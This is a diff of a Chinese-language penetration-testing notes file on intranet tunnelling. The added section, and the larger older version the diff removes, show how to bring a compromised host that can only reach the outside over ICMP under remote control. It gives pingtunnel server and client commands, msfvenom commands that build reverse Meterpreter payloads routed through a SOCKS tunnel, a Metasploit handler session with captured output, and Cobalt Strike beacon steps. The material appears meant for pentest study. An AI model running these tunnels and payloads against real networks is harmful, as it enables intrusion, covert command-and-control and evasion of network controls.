@@ -1,5 +1,7 @@
 # 内网穿透-隧道
 
+> [渗透测试之内网渗透（二）：内网穿透_渗透测试内网穿透各类工具使用情况-CSDN博客](https://blog.csdn.net/m0_74131821/article/details/130322657)
+
 ## 1. 内网穿透概述
 
 ### 1.1 概述
@@ -185,6 +187,83 @@ TCP、UDP、socks5 over ICMP，速度快，连接稳定，跨平台，client模�
 * icmptunnel：https://github.com/DhavalKapil/icmptunnel
 
 创建虚拟网卡通过ICMP协议传输网卡流量，基于ICMP隧道的vpn，需要root权限，动静极大，不推荐使用
+
+#### (3)上线仅ICMP协议出网的内网主机
+
+通过某种信道获取了内网主机的shell，但是当前信道不适合做远控（比如站库分离的网站，我们通过SQL注入获取了数据库服务器的shell，但是数据库服务器只有ICMP协议可以出网）
+
+ICMP协议可以出网，可以利用ICMP协议，构建反向的TCP over ICMP隧道或者SOCKS over ICMP隧道上线远控平台。搭建隧道的工具使用pingtunnel，它能通过ICMP隧道转发TCP、UDP、socks5连接
+
+
+
+##### ICMP隧道转发socks上线metasploit
+
+* 准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端
+
+```shell
+./pingtunnel -type server -noprint 1 -nolog 1
+```
+
+ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
+
+```shell
+pingtunnel.exe -type client -l 127.0.0.1:6688 -s icmpserver_ip -sock5 1 -nolog 1 -noprint 1
+# 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址
+# icmpserver_ip 192.168.1.10
+```
+
+生成支持socks5代理的反向payload的meterpreter并上传到ICMP隧道客户端执行即可上线
+
+```shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=c2_server_ip LPORT=8443 HttpProxyType=SOCKS HttpProxyHost=127.0.0.1 HttpProxyPort=6688 -f exe -o meterpreter.exe
+# c2_server_ip 192.168.1.10
+```
+
+启动msf监听，等待meterpreter执行上线
+
+```
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set lhost 0.0.0.0
+lhost => 0.0.0.0
+msf6 exploit(multi/handler) > set lport 8443
+lport => 8443
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 0.0.0.0:8443 
+[*] Sending stage (200774 bytes) to 192.168.1.11
+[*] Meterpreter session 2 opened (192.168.1.10:8443 -> 192.168.1.11:49967) at 2024-01-15 02:39:34 -0500
+
+meterpreter > getuid
+Server username: ECHO0D-WIN\echo0d
+```
+
+![image-20240115154056893](./img/Intranet_tunnel/image-20240115154056893.png)
+
+![image-20240115154019407](./img/Intranet_tunnel/image-20240115154019407.png)
+
+##### ICMP隧道转发socks上线cobaltstrike
+
+* 准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端
+
+```
+./pingtunnel -type server -noprint 1 -nolog 1
+```
+
+ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
+
+```
+pingtunnel.exe -type client -l 127.0.0.1:6688 -s icmpserver_ip -sock5 1 -nolog 1 -noprint 1
+
+# 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址
+```
+
+* cobaltstrike创建listener
+  这里的代理可以是socks或者HTTP，好像cobaltstrike不支持socks5代理，这里并不能成功上线
+  这里也可以使用HTTP代理，不过需要工具将HTTP代理转为socks5代理，比如privoxy
+
+* 选择创建的listener生成beacon上传到目标执行即可上线
 
 ### 2.1 传输层隧道工具
 
@@ -532,158 +611,7 @@ netstat -ano | findstr 127.0.0.1:8888
 
 
 
-### 2、上线仅ICMP协议出网的内网主机
-
-#### （1）背景
-
-通过某种信道获取了内网主机的shell，但是当前信道不适合做远控的通信信道（比如站库分离的网站，我们通过sql注入获取了数据库服务器的shell，但是数据库服务器只有ICMP协议可以出网）
-
-TCP和UDP等传输层协议不能出网
-DNS、HTTP等应用层协议也不能出网
-只有ICMP协议可以出网
-
-#### （2）方案
-
-ICMP协议可以出网，可以利用ICMP协议，构建反向的TCP over ICMP隧道或者SOCKS over ICMP隧道上线远控平台。搭建隧道的工具使用pingtunnel，它能通过ICMP隧道转发TCP、UDP、socks5连接
-
-#### （3）过程
-
-##### ICMP隧道转发TCP上线metasploit
-
-* 准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端
-
-```
-./pingtunnel -type server -noprint 1 -nolog 1
-```
-
-* ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
-
-```
-pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver_ip -t c2_server_ip:7777 -tcp 1 -noprint 1 -nolog 1
-该命令的意思是icmp客户端监听127.0.0.1:9999，通过连接到icmpserver_ip的icmp隧道，将127.0.0.1:9999收到的tcp数据包转发到c2_server_ip:7777
-```
-
-生成反向payload的meterpreter并上传到ICMP隧道客户端执行即可上线
-
-```
-msfvenom -p windows/meterpreter/reverse_https lhost=127.0.0.1 lport=9999 -f exe -o meterpreter.exe
-
-# 这里的lhost和lport为icmp客户端监听ip和端口
-```
-
-启动msf监听，等待meterpreter执行上线
-
-```
-# 这里的lhost和lport为icmp客户端转发到的ip和端口
-
-msf5 > use exploit/multi/handler
-msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
-payload => windows/meterpreter/reverse_https
-msf5 exploit(multi/handler) > set lhost 0.0.0.0
-lhost => 0.0.0.0
-msf5 exploit(multi/handler) > set lport 7777
-lport => 7777
-msf5 exploit(multi/handler) > run
-
-[*] Started HTTPS reverse handler on https://0.0.0.0:7777
-
-meterpreter > getuid
-Server username: DESKTOP-test0\admin
-```
-
-##### ICMP隧道转发socks上线metasploit
-
-* 准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端
-
-```
-./pingtunnel -type server -noprint 1 -nolog 1
-```
-
-ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
-
-```
-pingtunnel.exe -type client -l 127.0.0.1:6688 -s icmpserver_ip -sock5 1 -nolog 1 -noprint 1
-
-# 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址
-```
-
-生成支持socks5代理的反向payload的meterpreter并上传到ICMP隧道客户端执行即可上线
-
-```
-msfvenom -p windows/meterpreter/reverse_https LHOST=c2_server_ip LPORT=8443 HttpProxyType=SOCKS HttpProxyHost=127.0.0.1 HttpProxyPort=6688 -f exe -o meterpreter.exe
-```
-
-启动msf监听，等待meterpreter执行上线
-
-```
-msf5 > use exploit/multi/handler
-msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
-payload => windows/meterpreter/reverse_https
-msf5 exploit(multi/handler) > set lhost 0.0.0.0
-lhost => 0.0.0.0
-msf5 exploit(multi/handler) > set lport 8443
-lport => 8443
-msf5 exploit(multi/handler) > run
-
-[*] Started HTTPS reverse handler on https://0.0.0.0:8443
-
-meterpreter > getuid
-Server username: DESKTOP-test0\admin
-```
-
-##### ICMP隧道转发TCP上线cobaltstrike
-
-* 准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端
-
-```
-./pingtunnel -type server -noprint 1 -nolog 1
-```
-
-ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
-
-```
-pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver_ip -t c2_server_ip:7777 -tcp 1 -noprint 1 -nolog 1
-
-# 该命令的意思是icmp隧道客户端监听127.0.0.1:9999，通过连接到icmpserver_ip的icmp隧道，将127.0.0.1:9999收到的tcp数据包转发到c2_server_ip:7777
-```
-
-* cobaltstrike创建listener
-  https host和https port(c2)为ICMP隧道客户端的监听IP和端口
-  https port(bind)为转发目的地址的端口
-
-
-
-* 生成反向payload的beacon
-
-
-
-* 上传生成的beacon到ICMP隧道客户端执行，成功通过反向ICMP隧道上线
-
-
-
-##### ICMP隧道转发socks上线cobaltstrike
-
-* 准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端
-
-```
-./pingtunnel -type server -noprint 1 -nolog 1
-```
-
-ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
-
-```
-pingtunnel.exe -type client -l 127.0.0.1:6688 -s icmpserver_ip -sock5 1 -nolog 1 -noprint 1
-
-# 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址
-```
-
-* cobaltstrike创建listener
-  这里的代理可以是socks或者HTTP，好像cobaltstrike不支持socks5代理，这里并不能成功上线
-  这里也可以使用HTTP代理，不过需要工具将HTTP代理转为socks5代理，比如privoxy
-
-
-
-* 选择创建的listener生成beacon上传到目标执行即可上线
+* 
 
 ### 3、上线仅DNS协议出网的内网主机
 
